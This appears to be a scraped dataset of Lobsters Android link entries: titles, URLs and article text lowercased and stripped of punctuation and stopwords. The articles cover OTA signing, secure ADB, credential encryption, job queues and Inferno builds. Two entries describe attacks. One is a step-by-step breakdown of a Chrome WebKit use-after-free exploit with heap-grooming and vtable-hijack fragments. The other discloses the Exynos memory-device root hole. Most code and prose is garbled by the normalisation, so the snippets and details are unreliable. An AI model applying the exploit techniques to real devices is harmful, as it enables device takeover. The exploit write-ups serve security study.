mykeypem outform der passout stdin needed key sign apk like java jar signapkjar certcer testapk testsignedapk nothing new far except somewhat exotic easily parsable jce class key format however signapk extra sign whole file mode enabled w option mode addition signing individual jar entry tool generates signature whole archive well mode supported jarsigner specific android sign whole archive individual file already signed order support air update ota naturally ever flashed custom rom impatient updated device manually picked official update broadcast know ota package zip file containing updated file script apply turn however lot like jar file inside come metainf directory manifest signature block plus extra one metainfcomandroidotacert file contains update signing certificate pem format booting recovery actually apply update android verify package signature check signing certificate one trusted sign update ota trusted certificate completely separate regular system trust store reside guessed zip file usually stored systemetcsecurityotacertszip production device typically contain single file likely named going back original question ota file jar file jar file nt support wholefile signature signature go android signapk tool slightly abuse zip format adding nullterminated string comment zip comment section followed binary signature block final record containing signature offset size entire comment section make easy verify package first reading verifying signature block end file reading rest file major upgrade might hundred mb signature check want manually verify package signature openssl separate signed data signature block script like one second argument signature block file third one signed zip file without comment section write binenv python import o import sys import struct filename sysargv filesize osstat filename stsize f open filename rb fseek filesize footer fread sigoffset structunpack h footer sigstart filesize sigoffset sigsize sigoffset fseek sigstart sig fread sigsize fseek byte comment length byte string comment sd fread filesize sigoffset fclose sf open sysargv wb sfwrite sig sfclose zf open sysargv wb zfwrite sd zfclose summary android relies heavily java jar format application package apks system update ota package apk signing us subset jar signing specification ota package use custom format generates signature whole file standalone package verification performed standard jdk tool openssl preprocessing android o recovery system follow verification procedure installing apks applying system update next article explore o us package signature fit android security model
576,Lobsters,android,Android,Android Application (Dalvik) Memory Analysis & The Chuli Malware,http://www.504ensics.com/android-application-dalvik-memory-analysis-the-chuli-malware/,android application dalvik memory analysis chuli malware,,
578,Lobsters,android,Android,An Android application with no permissions can access the lock screen owner info string,https://gist.github.com/jcs/6b7b9a9b4a81bc521d68,android application permission access lock screen owner info string,special permission,android lock screen owner info permission get email address google account associated android device special permission required api level androidpermissionreadprofile androidpermissionreadcontacts yet completely unprivileged application read lockscreenownerinfo key settingssecure often contains thing user email address real name phone number andor physical address string info settingssecuregetstring getcontentresolver lockscreenownerinfo quick example
579,Lobsters,android,Android,Randomly Failed! The State of Randomness in Current Java Implementations,http://www.scribd.com/doc/131955288/Randomly-Failed-The-State-of-Randomness-in-Current-Java-Implementations,randomly failed state randomness current java implementation,,reading free preview page shown preview
581,Lobsters,android,Android,Secure USB debugging in Android 4.2.2,http://nelenkov.blogspot.co.uk/2013/02/secure-usb-debugging-in-android-422.html,secure usb debugging android,aosp funky android post suspect introduced android developer blog bother securing debugging android debug bridge jwdp otg tool gui securing adb adb toggle adbdsecure cyanogenmod secret knock adb overview presentation secure adb implementation summary,seems somehow managed let two month slip without single post time get back track recently unveiled android maintenance release provides nice opportunity jump start thing official release note android nt seem available time made way aosp quite promptly easily compile changelog based git log message simply check traditional one funky android see quite change want higher level overview time would probably better spent reading related post usual suspect deviating usually somewhat obscure topic focus new security feature quite visible received fair bit attention already even introduced official android developer blog fortunately u brief usual like dig little deeper interested detail shiny new secure debugging feature read bother securing debugging done development programming environment know debugging usually exact opposite secure debugging typically involves inspecting sometimes even changing internal program state dumping encrypted communication data log file universal root access scary necessary activity hard enough without bother security complicate thing making developer jump security hoop turn android debugging provided android debug bridge adb quite versatile give almost complete control device enabled course welcome developing testing application o also used purpose give overview nonexhaustive list thing adb let debug apps running device using jwdp install remove apps copy file device execute shell command device get system apps log debugging enabled device simply connecting device computer usb cable think much problem device locked bad news nt unlock device order execute adb command get worse device rooted many developer device access change every single file including system file password database course end nt actually need computer development tool order another android device otg usb cable sufficient security researcher notably kyle osborn build tool even gui automate try hard extract much data possible device short time mentioned device rooted bet trivial lift credential disable crack device lock even log google account even without root anything external storage sd card accessible example precious photo contact text message see kyle presentation detail attack vector least concerned leaving adb access wide open let see way secure securing adb despite innovative attack none particularly new remained mostly unaddressed probably debugging developer feature regular user nt even know thirdparty solution though let briefly review introducing one implemented core o two popular apps allow control usb debugging adb toggle adbdsecure automatically disable adb debugging device locked unplugged enable unlock plug usb cable generally sufficient protection one major drawback starting stopping adbd daemon requires root access want develop test apps device stock firmware still disable debugging manually root access typically go handinhand running custom firmware usually need root access flash new rom version least make much easier apps shipping rom take advantage root access give extra feature available stock o full backup tethering firewall etc result custom rom traditionally shipped root access enabled typically form suid su binary accompanying superuser app thus installed favourite custom rom automatically rooted cyanogenmod million user growing changed almost year ago disabling root access rom giving option enable apps adb bad compromise run root apps adb enabled without exposing device much used combination app automates toggling adb even control course solution nt apply majority android user running stock o version first step making adb access harder reach taken android hid developer option setting screen requiring use secret knock order enable mildly annoying developer make sure user enable adb access accident course stopgap measure manage turn usb debugging device vulnerable proper solution introduced maintenance release called secure usb debugging actually commited almost year ago reason nt make original jb release secure refers fact host explicitly authorized user connect adbd daemon device execute debugging command thus someone try connect device another one via usb order access adb need first unlock target device authorize access debug host clicking ok confirmation dialog shown make decision persistent checking always allow computer debugging work long machine one thing note tablet multiuser support confirmation dialog shown primary administrator user need switch order enable debugging naturally secure debugging effective reasonably secure lock screen password place everyone right pretty much need know order secure developer device interested implemented hood proceed next section first give brief overview adb architecture show extended order support authenticated debugging adb overview android debug bridge serf two main purpose keep track device emulator connected host offer various service client command line client ides etc consists three main component adb server adb daemon adbd default command line client adb adb server run host machine background process decouples client actual device emulator monitor device connectivity set state appropriately connected offline recovery etc adb daemon run android device emulator provides actual service client use connects adb server usb tcpip receives process command finally adb command line client let send command particular device practice implemented binary adb server thus share much code client talk local adb server via tcp typically via using text based command receives ok fail response return command like enumerating device port forwarding daemon restart handled local daemon eg shell log access naturally require connection target android device device access generally accomplished forwarding input output stream tofrom host transport layer implement us simple message byte header optional payload exchange command response go detail note newly added authentication command next section detail refer protocol description systemcoreadbprotocoltxt presentation feature quite helpful diagram example secure adb implementation adb host authentication functionality enabled default roadbsecure system property set way disable via system setting interface good thing device initially offline state go online state host authenticated may already know host use rsa key order authenticate adb daemon device authentication typically three step process host try connect device sends auth message type token includes byte random value read devurandom host responds signature packet includes signature random token one private key device try verify received signature signature verification succeeds responds connect message go online state verification fails either signature value nt match corresponding public key verify device sends another auth token new random value host try authenticating slowing number failure go certain threshold signature verification typically fails first time connect device new host nt yet host key case host sends public key auth rsapublickey message device take hash key display allow usb debugging confirmation dialog since adbd native daemon key need passed main android o accomplished simply writing key local socket aptly named adbd enable adb debugging developer setting screen thread listens adbd socket started receives message starting pk treat public key par calculates hash display confirmation dialog activity actually part systemui package tap ok sends simple simple ok response adbd us key verify authentication message otherwise stay offline case check always allow computer checkbox public key written disk automatically used signature verification next time connect host allowdeny debugging functionality along startingstopping adbd daemon exposed public method usbdevicemanager system service described adb authentication protocol detail nt said much actual key used process rsa key generated local adb server typically stored homeandroid adbkey adbkeypub window usually translates userpofile android key might end c case see issue default key directory overridden setting androidsdkhome environment variable adbvendorkeys environment variable set directory point also searched key key found location new key pair generated saved device key stored datamiscadbadbkeys file new authorized key appended file accept readonly vendor key stored adbkeys file nt seem exist current nexus device private key standard openssl pem format public one consists base encoded key followed user host user identifier separated space user identifier nt seem used moment meaningful unixbased os window always unknown unknown usb debugging confirmation dialog helpfully display key fingerprint let verify connected expected host adb client nt handy command print fingerprint host key might think little room confusion one cable plugged single machine running couple vms thing get little fuzzy one way displaying host key fingerprint format confirmation dialog us run homeandroid specify full path public key file awk print adbkeypubopenssl openssl cawk print tr lower upper reviewed secure adb debugging implemented shown needed show solves real problem finish screenshot failed adb attack device another android device look like summary android finally add mean control usb access adb daemon requiring debug host explicitly authorized user added whitelist help prevent information extraction via usb requires brief physical access demonstrated quite effective secure debugging feature user ever use directly along full disk encryption good screen lock password go long way towards making developer device secure
582,Lobsters,android,Android,Using Cryptography to Store Credentials Safely,http://android-developers.blogspot.com/2013/02/using-cryptography-to-store-credentials.html,using cryptography store credential safely,trevor john security privacy android apps antipattern securerandom modeprivate reference implementation documentation right way even security secretkeyfactory check apps proper use securerandom new security feature jelly bean,posted trevor john android developer relation team following talk security privacy android apps google io last year many people specific question use cryptography android many revolved around apis use specific purpose let look use cryptography safely store user credential password auth token local storage antipattern common incorrect pattern recently become aware use securerandom mean generating deterministic key material would used encrypt local credential cache example hard find elsewhere pattern rather storing encryption key directly string inside apk code us proxy string generate key instead similar passphrase essentially obfuscates key readily visible attacker however skilled attacker would able easily see around strategy nt recommend fact android existing security model already provides plenty protection kind data user credential stored modeprivate flag set stored internal storage rather sd card since permission nt enforced external storage combined device encryption provides protection type attack targeting credential however another problem using securerandom way described starting android default securerandom provider openssl developer longer override securerandom internal state consider following code securerandom securerandom new securerandom byte b new byte byte securerandomsetseed b prior android next line would always return number systemoutprintln securerandomnextint old bouncy castlebased implementation allowed overriding internally generated devurandom based key securerandom instance developer attempted explicitly seed random number generator would find seed replaces supplement existing seed contrary reference implementation documentation openssl errorprone behavior longer possible unfortunately application relied old behavior find output securerandom change randomly every time application start actually desirable trait random number generator attempting obfuscate encryption key manner longer work right way reasonable approach simply generate truly random aes key application first launched public static secretkey generatekey throw nosuchalgorithmexception generate key final int outputkeylength securerandom securerandom new securerandom seed securerandom automatically seeded system entropy keygenerator keygenerator keygeneratorgetinstance aes keygeneratorinit outputkeylength securerandom secretkey key keygeneratorgeneratekey return key note security approach relies safeguarding generated key predicated security internal storage leaving target file unencrypted set modeprivate would provide similar security even security app need additional encryption recommended approach require passphase pin access application passphrase could fed generate encryption key commonly used algorithm deriving key material passphrase using technique known key stretching android provides implementation algorithm inside secretkeyfactory public static secretkey generatekey char passphraseorpin byte salt throw nosuchalgorithmexception invalidkeyspecexception number hardening round use larger value increase computation time select value cause computation take final int iteration generate key final int outputkeylength secretkeyfactory secretkeyfactory secretkeyfactorygetinstance keyspec keyspec new pbekeyspec passphraseorpin salt iteration outputkeylength secretkey secretkey secretkeyfactorygeneratesecret keyspec return secretkey salt random string generated using securerandom persisted internal storage alongside encrypted data important mitigate risk attacker using rainbow table precompute password hash check apps proper use securerandom mentioned new security feature jelly bean default implementation securerandom changed android using deterministically generate key longer possible one developer generating key wrong way recommend upgrading app today prevent subtle problem user upgrade device running android later
584,Lobsters,android,Android,Exploiting 64-bit Linux like a boss,http://scarybeastsecurity.blogspot.se/2013/02/exploiting-64-bit-linux-like-boss.html,exploiting linux like bos,chrome release blog post linux aslr generally better window aslr although perfect,back november chrome release blog post mysteriously stated congratulation pinkie pie completing challenge exploit chrome patch autoupdates bug pretty fast webkit bug every consumer webkit patch bug particularly quickly waited month release full breakdown exploit exploit notable linux exploit generally harder exploit various reason including fact type heap spray table top linux aslr generally better window aslr although perfect example pinkie pie pwnium exploit defeated win aslr relying staticallyaddressed system object sort nonsense generally absent linux aslr without ado paste raw note exploit deconstruction number different technique used step involved quite impressive buga single webkit useafterfree bug used gain code execution logic flaw webkit reasonably simple webcore htmlvideoelement garbage collected base class member webcore htmlmediaelement mplayer webcore mediaplayer freed different object webcore mediasource hold stale pointer freed webcore mediaplayer stale pointer prodded indirectly via javascript method either j mediasource object j sourcebuffer object owned j mediasourcethe exploitthe exploit moderately complicated multiple step technique used pinkie pie state complexity warranted generally caused limited lack control therefore limited option making progress stagethe exploit step allocate large number rtcicecandidate object unreference small subset tempia new rtcs rtcstring aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa rtcdesc candidate rtcstring sdpmid rtcstring var rtcspush new rtcicecandidate rtcdesc var rtcs null var rtcs null step indirectly creates lot webcore webcorestringresource specific object later garbage collection free subset themthese object byte size fitting tcmalloc slab byte sized allocation mean future byte allocation large probability placed directly webcore webcorestringresource object significant latera sized buffer also trigger free mediaplayer sized buffer allocate another mediasource object buffer msaddsourcebuffer videowebm codecs vorbis vidparentnoderemovechild vid vid null gc tempia null gc new webkitmediasource sbl webcore mediaplayer byte size tcmalloc bucket freed many child object also freed important one byte sized webkit webmediaplayerclientimpl object tcmalloc bucket allocation webcore mediasource byte also subsequently allocates webcore sourcebufferlist child object byte free temporary byte buffer tempia ensure freed slot used webcore mediasource object leaving freed slot occupied webkit webmediaplayerclientimpl occupied new webcore sourcebufferlist call vtable freed webmediaplayerclientimpl buffertimestampoffset freein c trigger call chain webcore sourcebuffer webcore mediasource webcore mediaplayer virtual webkit webmediaplayerclientimplyou notice call chain bounce webcore mediaplayer freed however access webcore mediaplayer mprivate member offset delete ing object interferes first byte account tcmalloc writing two freelist pointer webcore mediaplayer mmediaplayerclient member webcore mediaplayer free slot otherwise meaningfully reused pointwhat happens next fascinating webcore mediaplayer sourcesettimestampoffset dissassembles mov rdi qword ptr mov rax qword ptr rdi mov rax qword ptr jmp raxthis load vtable webcore mediaplayer mprivate member call vtable function webcore mediaplayer mprivate supposed webkit webmediaplayerclientimpl object webcore sourcebufferlist overlayed webcore sourcebufferlist object vtable much smaller one offset vtable hit vtable function totally different vtable specifically webcore refcountedsupplement refcountedsupplement disassembles lea rax mov qword ptr rdi rax jmp wtf fastfree void opcodes execute rdi pointer webcore sourcebufferlist object calling code believed pointer webkit webmediaplayerclientimpl object see side effect opcodes trash vtable pointer webcore sourcebufferlist object free ie free webcore sourcebufferlist object return cleanly use webdatabase functionality allocate sqlstatement side effect transactionexecutesql derp function function slength sbllength webcore sqlstatement object byte size allocated slot vacated free ing webcore sourcebufferlist object step slot free webkit webmediaplayerclientimpl fromthere two javascript object pointing freed object direct handle freed webcore sourcebufferlist sbl indirect handle freed webkit webmediaplayerclientimpl buffer time call made javascript sbllength required exploit nothing done integer result looking call cover instructiveto return length sizet read offset webcore sourcebufferlist object since webcore sqlstatement put top freed webcore sourcebufferlist actual value read webcore sqlstatement mstatementerrorcallbackwrapper mcallback member pointer leaking value javascript might useful heap address however javascript length lower address leaked entropy important aslr linux largely next bit bottom bit heap address usefully leaked exploitation similar overlap situation would problem system abuse overlapping field sourcebufferlist v sqlstatement sb sbl next javascript array index operator used time javascript handle webcore sourcebufferlist actually backed webcore sqlstatement object c level webcore sourcebufferlist mlist member wtf vector start two important field length pointer underlying bufferas covered length map pointer value pointer value treated integer large effectively sizing vector massively vector underlying buffer pointer map member sqlstatement mstatementerrorcallbackwrapper mscriptexecutioncontexttherefore javascript array operator j sourcebufferlist return j sourcebuffer object backed c pointer pulled somewhere c webcore scriptexecutioncontent object depending array indexthe exploit us array index corresponds offset webcore scriptexecutioncontext mpendingexceptions pointer wtf vector javascript handle j sourcebuffer object really backed wtf read vtable value javascript number sbtimestampoffset c timestampoffset property read double offset webcore sourcebuffer object webcore sourcebuffer object currently backed wtf vector object byte size life byte tcmalloc slot therefore read offset fact read beginning next tcmalloc slot looking back step arranged likely adjacent byte slot contain webcore webcorestringresource object therefore webcore webcorestringresource vtable read returned javascript number javascript number double truncation issue like discussed reading integer length step lot effort finally exploit leaked vtable value javascript given build chrome easy calculate exact address opcodes function etc retrigger useafterfree back freed object array buffer videowebm codecs vorbis null gc var ia new new webkitrtcpeerconnection iceservers time freed webkit webmediaplayerclientimpl replaced raw byte buffer read written javascript useful primitive aslr defeated useful vtable pointer value put first byte raw byte buffera webcore rtcpeerconnection also allocated byte occupy slot freed webcore mediaplayer protects freed webcore mediaplayer corruption significantly make sure nothing overwrites webcore mediaplayer mprivate pointer pointer needed intact offset webcore rtcpeerconnection overwrite field leak address heap buffer javascript control prepdata foundvt ia prepdata ia ia var new var ib new var ibaddr ia ia using knowledge binary layout vtable value chosen result webcore mediaplayer sourceappend vtable call site calling function internal hstorenamedfield setsideeffectdominator appropriate function name disassembles mov qword ptr rdx ret seen value rdx nonthis function parameter written offset backed raw buffer pointer ia javascript rdx context webcore mediaplayer sourceappend raw buffer pointer ib javscript address heap buffer control javascript leaked proceed normalthe exploit control vtable pointer point vtable pointer heap buffer content controlled arbitrarily exploit free start rop chain etcas happens exploit payload expressed term valid full function call achieved bouncing useful sequence opcodes template base internal invoker mov rax rdi lea rcx mov rsi qword ptr mov rdx qword ptr mov rax qword ptr mov rdi qword ptr jmp raxas seen opcodes pull jump target new pointer two function argument current pointer useful construct
585,Lobsters,android,Android,Dexter is a static Android application analysis tool,http://dexter.dexlabs.org/,dexter static android application analysis tool,error page displayed please contact service provider detail,error page displayed please contact service provider detail
586,Lobsters,android,Android,apk2gold CLI tool for decompiling Android apps to Java,https://github.com/lxdvs/apk2gold,cli tool decompiling android apps java,easyaspie android decompiler one stop shop collocation source file regeneration r reference note installation dependency installing usage getting apk post decompiling looking result know would cool,easyaspie android decompiler one stop shop got pretty tired decompiling android apps bunch step remember time involved lot apktool jdgui still confuses collocation source file even step complete usually combination jdgui would left disparate source information decompiled java would directory undexed content would somewhere else really bad importing eclipse basically wanted make generate tree source close possible original android developer see regeneration r reference one thing existing decompilers nt regenerate r reference tool includes script make attempt give insight reading source code view v inflaterinflate container false view v inflaterinflate rlayoutresultpanel container false easily see search resource without needing filesearch rjava opaque int note process relies guess may lead weird result resource ints inlined opaque check source code rreassocpy see matching heuristic adjust appropriately basically small amount original content r thing script wrapping excellent tool designed easily installed get best result android app introspection quickly possible project stand shoulder following giant installation dependency need python git submodules mercurial hg subbuilds maven mvn jdcli sorry installing run makesh usage getting apk different way acquire apk easiest download play store use e file explorer back apk e file explorer appmgr tab long click app want backup apk backup directory sd card usb like email e file explorer depth found post decompiling actually using tool easy pie use target apk looking result create folder apk name without apk suffix everything also additional directory may recognize smali contains smali output apktool kept around reference case jd something bad load eclipse fun note result almost certainly compile really goal want get idea whats happening source code check malicious shit etc know would cool would real cool look section jd bailed decompiling sub smali code generated apktool would baller
587,Lobsters,android,Android,Android Observatory - Malware Database,http://www.androidobservatory.org/,android observatory malware database,zomp,zomp welcome zompcryptixnet
588,Lobsters,android,Android,Mosh for (irssi)ConnectBot,http://dan.drown.org/android/mosh/,mosh irssi connectbot,alternative see termux common question connectbot apk source code known issue changelog,notice project longer maintained alternative see termux common question q create mosh connection instead ssh connection default connection created ssh protocol change protocol mosh lefthand drop creating new connection connectbot apk source code known issue nt time maintain project pretty much unmaintained point warning private key setting uploaded google server part builtin android application setting backup way set path remote mosh server mosh background service killed example case memory retain session information reconnect without going ssh apk wo nt install real irssiconnectbot installed lot output session nt foreground might buffer take awhile playback moshserver refuse start locale safe irssiconnectbot print error message without upgrading mosh server current github version mosh connection cell network drain battery quickly run moshclient binary hand make sure term set segfault pc pc datadataorgwoltageirssiconnectbotfilesliblibgnustlsharedso cxatypematch ldr pc vtable classtypeinfo pc android device physical keyboard menu button brings list key button server mosh passing locale fail ssh server reject sending lang environment fix update server later accepts l option changelog hardcoded lang fixed proguard flag fix pubkey generation fixed gingerbread earlier menu button crash icon top left action bar navigates host list page moshclient sent sigstop app background conserve battery power usb keyboard shift sends proper key fixed hardware keyboard ctrl escape longpress host edit host mosh port request locale send fixed freeze remote ssh server reject lang environment variable mosh work jelly bean added r feed fixed build system nt skip code launch mosh local shell joakim andersson fix postlogin command using mosh joakim andersson include asus transformer pad infinity hardware keyboard list joakim andersson make unloading key disconnect configurable timo sirainen support fixed mosh widget shortcut switched static linked version moshclient save disk space recompiled support older processor many feature fix horizontal swipe top half screen switch session buttom half switch irssi channel allow specification ssh bindaddress port forward url scan remove duplicate url use systemxbinbash local session file exists many others allow editing path remote moshserver another set feature fix fix various terminal emulation bug new preference keyboard various others fixed fc new installs fixed moshclient binary getting installed first launch fixed imported pemopenssh public key fixed bug unloaded public key disconnect added note setting private key backed google application setting backup service added android lollipop support
589,Lobsters,android,Android,"Security flaw found in Samsung handsets, tablets",http://www.zdnet.com/security-flaw-found-in-samsung-handsets-tablets-7000008880/,security flaw found samsung handset tablet,user claim newest version chip provided download,suspected fault samsung implementation android kernel could result malicious apps gaining control user device brought light user alephzain mobile developer forum xda developer user claim flaw potentially affect samsung device use exynos processor model specific example including samsung galaxy samsung galaxy note use dual core fourthgeneration exynos chip exynos samsung armbased system chip newest version chip exynos clocked speed encompasses latest arm architecture well arm mali quadcore graphic processing unit gpu latest version exynos also recently used latestgeneration samsung chromebook stating security hole kernel exactly device devexynosmem calling security flaw huge mistake alephzain go describe finding good news easily obtain root device bad control ram dump kernel code injection others could possible via app installation play store certainly exists many way samsung give easy way exploit security hole dangerous expose phone malicious apps exploitation native c jni could easily feasible soon another forum member chainfire thoughtfully provided download android application package familiar apk see downloading new app mobile device exploit vulnerability afraid exploit app use gain root without asking without permission vulnerable device forum use wrote let hope fix asap according chainfire affected device include samsung galaxy samsung galaxy note samsung galaxy note samsung galaxy tab plus community say informed samsung flaw hope fix soon issued claim ring true many apps floating around internet android operating system become increasing target hacker slip malicious code seemingly innocent application end stealing data taking control device malicious apps begin send unauthorized premiumrate sm message steal user bank data keeping device secure important careful surf web desktop
590,Lobsters,android,Android,Root exploit on Exynos,http://forum.xda-developers.com/showthread.php?p=35469999,root exploit exynos,edit general discussion topic please post following location http forumxdadeveloperscomshow php http forumxdadeveloperscomshow php edited,edit general discussion topic please post following location http forumxdadeveloperscomshow php find oneclick root application http forumxdadeveloperscomshow php exploit coming hi recently discover way obtain root without odin flashing security hole kernel exactly device devexynosmem device rw user give access physical memory wrong samsung like devmem three library seems use devexynosmem systemliblibhdmiso many device concerned samsung galaxy samsung galxy note meizu mx potentialy device embed exynos processor use samsung kernel source good news easily obtain root device bad control ram dump kernel code injection others could possible via app installation play store certainly exists many way samsung give easy way exploit security hole dangerous expose phone malicious apps exploitation native c jni could easily feasible edited detail devexynosmem seems used graphic usage like camera graphic memory allocation hdmi activating pid display kmsg surfaceflinger mmap device via one three shared library see reference binary libraires operation allowed device linuxdriverscharmemc code static const struct fileoperations exynosmemfops open exynosmemopen release exynosmemrelease unlockedioctl exynosmemioctl mmap exynosmemmmap default permission linuxdriverscharmemc code ifdef configexynosmem exynosmem sirusr siwusr sirgrp siwgrp siroth siwoth exynosmemfops endif ioctl request devexynosmem permit clean flush cache set non cacheable page memory set physical memory address use mmap interesting part mmap operation limit restrict access lowmem linuxdriverscharexynosmemc code todo currently lowmem avaiable phystovirt start void pageoffset phystovirt start highmemory prerr invalid paddr n func start return einval comment code could frightening eye documentationarmmemorytxt say code start end use pageoffset kernel directmapped ram region map platform ram typically map platform ram relationship word device permit physical memory including kernel code question permission set readwrite kernel samsung developper charge would lose job samsung apps basic right need access doubt huge mistake simple patch could set permission nt know would affect samsung applicationsservices attachment binary source obtain root shell
593,Lobsters,android,Android,ActiveAndroid - Active record style SQLite persistence for Android,http://www.activeandroid.com/,activeandroid active record style sqlite persistence android,activeandroid object relational mapper documentation license apache version contributing pull request running test suite author wwwmichaelpardocom wwwactiveandroidcom,activeandroid activeandroid active record style orm object relational mapper mean exactly well activeandroid allows save retrieve sqlite database record without ever writing single sql statement database record wrapped neatly class method like save delete activeandroid much though accessing database hassle say least android activeandroid take care setup messy stuff simple step configuration documentation license apache version copyright c michael pardo licensed apache license version license may use file except compliance license may obtain copy license http unless required applicable law agreed writing software distributed license distributed basis without warranty condition kind either express implied see license specific language governing permission limitation license contributing please fork repository contribute back using pull request contribution large small major feature bug fix unit test welcomed appreciated thoroughly reviewed discussed run test suite following instruction running test suite wiki page author michael pardo wwwmichaelpardocom wwwactiveandroidcom
595,Lobsters,android,Android,"Sidekiq vs Resque, with MRI and JRuby - Josh Rendek",http://joshrendek.com/2012/11/sidekiq-vs-resque/,sidekiq v resque mri jruby josh rendek,threading v forking forking forking ruby threading threading ruby source threading jruby jvm sidekiq resque resque view world resque github sidekiq view world sidekiq github test code test machine crucial ssd result time process set number type time completion second cpu resque worker sidekiq mri process thread sidekiq mri process thread sidekiq mri process thread sidekiq jruby thread sidekiq jruby thread thread overview reading deploying jruby deliver scalable web apps using jvm pragmatic programmer jruby cookbook sidekiq resque sidekiq resque,dive benchmark resque v sidekiq first help better understanding forking threading work ruby threading v forking forking fork process creating entire copy process address space open file descriptor get separate copy address space parent process isolating work done fork forked child process lot work us lot memory child exit memory get free back operating system programming language mri ruby support actual kernel level threading way spread work across multiple core since process get scheduled different core also gain stability since child crash parent respawn new fork however caveat parent dy child exited child become zombie forking ruby one important note forking ruby maintainer done good job keeping memory usage forking ruby implement copy write system memory allocation child fork benchmark let fill memory test objs test objectnew forkpids processfork sleep end p processwaitpid p see action however start modifying memory inside child fork memory quickly grows forkpids processfork objs objectnew end end p processwaitpid p creating million new object forked child threading thread hand considerably le overhead since share address space memory allow easier communication versus interprocess communication fork context switching thread inside process also generally cheaper scheduling switch process depending runtime used issue might occur using thread instance needing use lot memory task handled garbage collector part one benefit threading worry zombie process since thread die process dy avoiding issue zombie threading ruby gil global interpreter lock gone renamed gvl global vm lock gvl mri ruby us lock called rbthreadlockt mutex around ruby code run ruby object touched actually run ruby thread parallel gvl kick ie system level blocking call io blocking outside ruby blocking call thread check interrupt rubyvmcheckints mri ruby thread preemptively scheduled using function called rbthreadschedule schedule interrupt let thread get fair amount execution time every microsecond source see example gilgvl action test objs objectnew num thread threadnew objs objectnew end end join normally would unsafe operation since gilgvl exists worry two thread adding ruby object since one thread run vm end atomic operation although rely quirk thread safety definitely apply vms another important note ruby gc really horrible job benchmark memory kept growing kill process second threading jruby jvm jruby specifies use native thread based operating system support using getnativethread call jruby implementation thread using jvm mean gilgvl allows cpu bound process utilize core machine without deal forking case resque expensive trying execute gil safe code jruby spit concurrency error concurrencyerror detected invalid array content due unsynchronized modification concurrent user either add mutex around code modify worry concurrent access chose latter test objs test objectnew num thread threadnew objs num objs num nil objs num objectnew end end join compared mri version ruby running jvm able make optimization keep memory usage around duration test better understanding difference forking threading ruby let move sidekiq resque sidekiq resque resque view world resque assumes chaos environment follows forking model c ruby make complete copy resque parent new job need run advantage preventing memory leak long running worker locking run issue forking though need increase amount worker machine end enough spare cpu cycle since majority taken handling forking resque follows simple fork work model worker take job queue fork new process job resque github sidekiq view world unlike resque sidekiq us thread extremely easy use drop replacement resque since work perform method dig result see sidekiq claim able handle larger number worker amount work true due using thread allocate new stack address space fork get overhead back able work threaded model sidekiq follows actor pattern compared resque n worker fork sidekiq actor manager n thread one fetcher actor pop job redis hand manager sidekiq handle chaos portion resque catching exception bubbling exception handler airbrake errbit know sidekiq resque work get testing comparing result sidekiq github test code idea behind test pick cpu bound processing task case apply across set number time sidekiq resque digest running sidekiq r porrb c require sidekiq require por queueing sidekiq clientenqueue por rand queueing resqueenqueue por rand por include sidekiq worker queue por def perform arr arreach digest atos end end def selfperform arr arreach digest atos end end test machine model name mac pro model identifier processor name quadcore intel xeon processor speed ghz number processor total number core cache per core kb cache per processor mb memory gb processor interconnect speed gts give u total core use testing also using crucial ssd result time process set number typetime completion second sidekiq jruby sidekiq jruby sidekiq jruby sidekiq mri sidekiq mri sidekiq mri resque cpu resque worker see forking taking toll available cpu processing roughly cpu wasted forking scheduling new process resque took second finish process job sidekiq mri process thread fully utilizing cpu running test pegged one cpu usage kept duration test slight overhead system cpu usage sidekiq took second thread using mri ruby let take look thing bit resqueish use multiple sidekiq process get thread scheduled across multiple cpu sidekiq mri process thread better cut processing time roughly third utilizing resource cpu sidekiq process thread total thread took second complete job sidekiq mri process thread keep adding process get scheduled different core seeing cpu usage go even however process come overhead process scheduling versus thread scheduling still wasting cpu cycle completing job second sidekiq jruby thread much better native thread o level thread completing set job second sidekiq jruby thread thread longer seeing increase much cpu usage slight decrease processing time keep adding thread end running thread contention issue accessing redis quickly pop thing queue overview even stick stock mri ruby go sidekiq going see huge decrease cpu usage also gaining little bit performance well sidekiq overall provides cleaner object oriented interface opinion inspecting job going processing queue resque would something like resquesize queuename however sidekiq would take class case por call porjobs get list job worker queue note need require sidekiqtesting get access job method thing find missing sidekiq enjoyed resque ability inspect failed job web ui however sidekiq make ability automatically retry failed job although careful introduce race condition accidentally do course jruby come top give u best performance bang buck although mileage may vary depending task reading deploying jruby deliver scalable web apps using jvm pragmatic programmer jruby cookbook sidekiq resque sidekiq resque
596,Lobsters,android,Android,Building Inferno OS for Android Phones,http://www.bluishcoder.co.nz/2012/06/11/building-inferno-os-for-android-phones.html,building inferno o android phone,updated build instruction inferno plan run hosted version inferno android phone youtube video running boot gecko mozilla developer network mercurial repository hosted bitbucket agcc available get working ic infernopatch readmeandroid,updated moved patch file github provided updated build instruction build instruction update post still valid inferno small operating system built run host operating system user process natively bare hardware inferno us idea plan operating system interesting feature include plan system representing resource file using protocol last year source binary released run hosted version inferno android phone youtube video running binary installation quite tightly tied specific android revision involves replacing initrc file phone enable dual booting android inferno replacing file version android different replacement based wo nt work example version used gingerbread device wo nt work ice cream sandwich device set building source could run inferno nexus alongside boot gecko used base instead android easier build interesting compare two operating system approach phone warning step flash data phone may result reflash original o make backup first inferno experimental operating system running phone may make great phone experience early stage development first step build system pretty well covered mozilla developer network basic step build nexus phone connected pc git clone git cd configsh nexus buildsh export pwd cd want flash phone run following command phone connected delete everything phone needed want try inferno rooted android phone cd flashsh flashsh gaia cd use tool build inferno adb copy device start recent port inferno run android available mercurial repository hosted bitbucket cloned path modified use linux version inferno build tool also need build unfortunately repository modification get android build working broken linux build slightly first build attempt fail manually build feature need location build need datainferno match directory device build linux tool cloning edit mkconfig file following setting change existing one set androidarm syshostlinux build cd data hg clone http bitbucketorgfloreninferno cd inferno vim mkconfig change syshost objtype makemksh export path path mk nuke mk install error ignore error continue cd mk install cd cd libmath mk install cd cd utilsiyacc mk install cd cd limbo mk install cd linux tool built build android version requires arm c compiler compatible android use one built build process accessed via wrapper shell script called agcc agcc script based using android sdk patch work toolset available assumes gcc path example set need change cloned also adjust instruction put agcc somewhere path use bin subdirectory home directory unable get prebuilt audio binary working provided inferno android port also change needed get working ic patch disable audio compile ic get event working infernopatch applied command edit mkconfig file following setting change existing one set earlier syshostandroid objtypearm install agc modified use cd bin curl http plausibleorgandyagcc agcc chmod x agcc curl http wwwbluishcoderconzinfernoagccpatch patch export path path issue building using toolchain regarding stdlibh prevent compile error around use wchart modified line change ifndef inferno prevent wchart usage mblen friend used build android inferno cd datainferno vim 